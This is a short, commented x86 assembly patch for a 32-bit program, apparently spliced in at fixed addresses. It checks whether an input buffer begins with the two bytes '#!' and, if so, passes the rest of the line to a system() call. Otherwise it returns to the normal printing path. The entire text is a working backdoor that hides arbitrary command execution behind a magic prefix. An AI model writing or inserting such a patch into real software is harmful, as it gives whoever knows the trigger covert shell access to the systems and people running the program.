/* jmp over our code */
push 0x8048662
ret

/* check the first two chars */
lea eax,[ebp-0x40c]
mov ebx, [eax]
mov ecx, 0x04032123
cmp bl, cl
jne abort
cmp bh, ch
jne abort

/* increase the string pointer by two, push it, then call system */
lea eax,[eax+2]
push eax
mov eax, 0x8048460
call eax
push 0x8048662
ret

/* abort the call to system and jmp to print the line */
abort:
push 0x804863A
ret
